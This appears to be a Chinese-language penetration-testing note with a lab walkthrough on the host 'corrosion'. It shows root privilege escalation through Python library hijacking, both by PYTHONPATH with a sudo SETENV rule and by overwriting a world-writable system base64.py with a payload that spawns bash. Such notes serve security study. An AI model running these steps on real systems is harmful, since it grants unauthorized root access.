# 权限提升



## sudo



## 服务提权



## Python 库劫持

#### PYTHONPATH

Python 在导入模块时，会按 `sys.path` 列表中的顺序搜索路径。攻击者可将恶意库放置在高优先级的路径中（如当前工作目录），覆盖合法库。

通过设置 `PYTHONPATH` 环境变量，添加攻击者控制的目录到模块搜索路径的最前端。



查看用户的 sudo 权限，允许设置环境变量，允许通过 sudo 以 root 用户允许某个 Python 脚本。

```
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) SETENV: PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本的内容如下，脚本中使用 base64，可以通过 PYTHONPATH 环境变量进行劫持。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



创建 /tmp/lib 目录，创建 base64.py 文件

```
-rwxrwxr-x 1 randy randy   33 Mar  3 03:39 base64.py
```



base64.py 文件的内容为启动一个 bash

```
import os
os.system('/bin/bash')
```



劫持成功

```
randy@corrosion:/tmp/lib$ sudo PYTHONPATH=/tmp/lib/ /usr/bin/python3.8 /home/randy/randombase64.py 
root@corrosion:/tmp/lib# id
uid=0(root) gid=0(root) groups=0(root)
```





#### 库文件修改

Python 脚本使用某个库文件（如：base64.py），允许以 root 用户脚本，用户可以**修改库文件内容**。



sudo 允许以 root 用户运行脚本

```
sudo -l

Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本如下：

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



## 动态链接库劫持


